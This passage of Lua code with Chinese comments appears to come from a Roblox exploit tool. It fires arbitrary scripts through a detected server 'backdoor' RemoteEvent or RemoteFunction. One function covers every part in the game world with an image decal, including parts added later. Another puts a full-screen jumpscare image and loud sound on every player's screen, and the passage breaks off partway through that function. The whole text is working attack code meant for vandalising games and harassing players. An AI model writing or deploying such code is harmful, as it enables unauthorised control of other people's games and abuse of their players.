-- 所有物体贴图的函数
local function executeDecalScript()
    if not attached or not backdoor then
        notify("❌ 请先检测后门！")
        return
    end
    
    local decalScript = [[
        local decalTexture = "http://www.roblox.com/asset/?id=97925433444604"
        local workspace = game:GetService("Workspace")
        
        for _, descendant in pairs(workspace:GetDescendants()) do
            if descendant:IsA("Part") or descendant:IsA("UnionOperation") then
                for _, face in pairs(Enum.NormalId:GetEnumItems()) do
                    local decal = Instance.new("Decal")
                    decal.Face = face
                    decal.Texture = decalTexture
                    decal.ZIndex = 99
                    decal.Parent = descendant
                end
            end
        end
        
        workspace.DescendantAdded:Connect(function(descendant)
            wait(0.1)
            if descendant:IsA("Part") or descendant:IsA("UnionOperation") then
                for _, face in pairs(Enum.NormalId:GetEnumItems()) do
                    local decal = Instance.new("Decal")
                    decal.Face = face
                    decal.Texture = decalTexture
                    decal.ZIndex = 99
                    decal.Parent = descendant
                end
            end
        end)
    ]]
    
    if backdoor.ClassName == "RemoteEvent" then
        backdoor:FireServer(decalScript)
    elseif backdoor.ClassName == "RemoteFunction" then
        backdoor:InvokeServer(decalScript)
    end
    
    notify("✅ 所有物体贴图已应用！")
end

-- 跳脸功能函数
local function executeJumpScare(imageId)
    if not attached or not backdoor then
        notify("❌ 请先检测后门！")
        return
    end
    
    local jumpScareScript = string.format([[
        local Players = game:GetService("Players")
        local SoundService = game:GetService("SoundService")
        
        for _, player in ipairs(Players:GetPlayers()) do
            if player:FindFirstChild("PlayerGui") then
                local ScreenGui = Instance.new("ScreenGui")
                local ImageLabel = Instance.new("ImageLabel")
                
                ScreenGui.Parent = player.PlayerGui
                ScreenGui.IgnoreGuiInset = true
                ScreenGui.Name = "JumpScare"
                ScreenGui.ResetOnSpawn = false
                
                ImageLabel.Parent = ScreenGui
                ImageLabel.Size = UDim2.new(1, 0, 1, 0)
                ImageLabel.Image = "http://www.roblox.com/asset/?id=%s"
                ImageLabel.BackgroundColor3 = Color3.new(0, 0, 0)
                ImageLabel.BackgroundTransparency = 0
                ImageLabel.ScaleType = Enum.ScaleType.Fit
                
                local sound = Instance.new("Sound", ScreenGui)
                sound.SoundId = "rbxassetid://6018028320"
                sound.Volume = 10
                sound.Looped = false
                
                sound.Ended:Connect(function()
                    ScreenGui:Destroy()
                end)
                
                sound:Play()
                
                delay(30, function()
